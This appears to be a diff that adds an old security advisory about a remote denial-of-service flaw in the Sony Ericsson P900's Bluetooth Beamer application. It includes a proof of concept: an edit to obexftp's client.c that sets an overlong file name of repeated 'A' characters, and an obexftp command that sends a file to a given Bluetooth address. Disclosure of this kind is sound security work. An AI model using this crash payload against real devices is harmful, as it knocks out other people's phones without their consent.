@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/13782/info
+
+Sony Ericsson P900 handset is affected by a remote denial of service vulnerability. This issue arises because the application fails to perform boundary checks prior to copying user-supplied data into a finite sized buffer.
+
+The vulnerability presents itself in the Bluetooth-related Beamer application when handling a malformed file.
+
+Sony Ericsson P900 handset is reportedly affected, however, other handsets such as Sony Ericsson P800 may be vulnerable as well. 
+
+Create a malformed name using 'remotename' in 'obexftp_put_file' function of obexftp client.c:
+
+---- snip ---
+object = build_object_from_file (cli->obexhandle,localname, \
+"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA \
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
+---- snip ---
+
+Chose any existing file and send it using obexftp:
+# ./obexftp -b 00:0A:D9:E7:0B:1D --channel 2 -p /etc/passwd -v 
